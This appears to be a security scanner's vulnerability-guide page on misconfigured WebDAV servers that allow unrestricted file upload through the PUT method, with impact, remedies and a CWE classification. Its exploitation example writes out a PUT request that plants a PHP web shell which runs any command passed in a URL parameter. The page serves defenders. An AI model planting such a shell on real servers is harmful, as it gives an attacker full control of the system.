---
title: "Insecure WebDAV Server: Unrestricted File Upload"
slug: "insecure-webdav-server-unrestricted-file-upload"
hidden: true
createdAt: "2021-12-14T07:14:35.620Z"
updatedAt: "2022-08-05T19:42:20.382Z"
---
[block:html]
{
  "html": "<div>\n  <a href=\"/docs/vulnerability-guide\">< Back to tests</a>\n</div>"
}
[/block]

[block:html]
{
  "html": "<b>Severity</b>: <b><font color=\"#DB1E54\">High</font></b><br>\n<b>Test name</b>: Common Server Misconfigurations"
}
[/block]

[block:html]
{
  "html": "<table id=\"simple-table\">\n   <style>\n #simple-table {\n    border-collapse: separate;\n    width: 100%;\n    display: block;\n    display: table;\n  }\n#simple-table th {\n    padding: 1.5%;\n    text-align: left;\n    vertical-align: text-top;\n    background-color: #B2D6DA;\n  </style>\n  <body>\n    <tr>\n        <th><strong>Summary</strong></th>\n    </tr>\n</table>\n  </body>"
}
[/block]
WebDAV, or Web Distributed Authoring and Versioning, is a protocol that allows users to remotely collaborate and edit content on the web.

WebDAV is a term given to a collection of HTTP methods. HTTP requests can use a range of methods other than standard GET and POST. WebDAV can be used to manipulate files on the web server. If WebDAV is misconfigured, an attacker can get a local or root shell on the system using the publicly accessible PUT method (also known as one of the WebDAV methods) and upload an unrestricted file. Once the file is uploaded to the server it can be renamed, moved or executed. The web application takes the uploaded file and saves it in the file system, data storage, or in a database.

If a malicious file has been uploaded into the file system, the attacker is able to request this file using the URL of the victimâ€™s site. As a result, the attacker can execute any arbitrary command on the web server.
[block:html]
{
  "html": "<table id=\"simple-table\">\n    <tr>\n        <th><strong>Exploitation example</strong></th>\n    </tr>\n</table>"
}
[/block]
1. Let's imagine an admin forgot to disable the usage of some HTTP methods like PUT.

2. Expected request example:

[block:code]
{
  "codes": [
    {
      "code": "# GET method is expected to be available\nGET /webdav HTTP/1.1\nHost: example.com",
      "language": "text"
    }
  ]
}
[/block]
3. An attacker can send the following request:
[block:code]
{
  "codes": [
    {
      "code": "PUT /webdav/shell.php HTTP/1.1\nHost: example.com\nContent-Type: application/octet-stream\n\n# BODY Payload:\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd']);\n    }\n?>",
      "language": "text"
    }
  ]
}
[/block]
4. This will create a shell script on WebDAV. If the script is executed, it allows sending any system commands and executing them, taking complete control over the system.
[block:html]
{
  "html": "<table id=\"simple-table\">\n    <tr>\n        <th><strong>Impact</strong></th>\n    </tr>\n</table>"
}
[/block]
This vulnerability leads to:
* Remote Code Execution
* Unauthorized Access
* Data Leakage
* Denial of Service (DoS)
* Buffer Overflow
[block:html]
{
  "html": "<table id=\"simple-table\">\n    <tr>\n        <th><strong>Location</strong></th>\n    </tr>\n</table>"
}
[/block]
The issue can be found in the **server configuration**.
[block:html]
{
  "html": "<table id=\"simple-table\">\n    <tr>\n        <th><strong>Remedy suggestions</strong></th>\n    </tr>\n</table>"
}
[/block]
* Ensure the WebDav service is updated to the latest version.
* If you are not using the WebDAV extension, it's recommended to be disabled. 
* Only GET and POST HTTP methods should be allowed and other unused methods should be blocked. If required, these other methods should only be enabled with credentials and public access denied. Make sure the password used is complex and unguessable.
[block:html]
{
  "html": "<table id=\"simple-table\">\n    <tr>\n        <th><strong>Classifications</strong></th>\n    </tr>\n</table>"
}
[/block]
* CWE-434
* CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:H/RL:O/RC:C
[block:html]
{
  "html": "<table id=\"simple-table\">\n    <tr>\n      <th><strong>References</strong></th>\n    </tr>\n</table>"
}
[/block]
	
* https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html 
* https://datatracker.ietf.org/doc/html/rfc2518 
[block:html]
{
  "html": "<div>\n  <a href=\"/docs/vulnerability-guide\">< Back to tests</a>\n</div>"
}
[/block]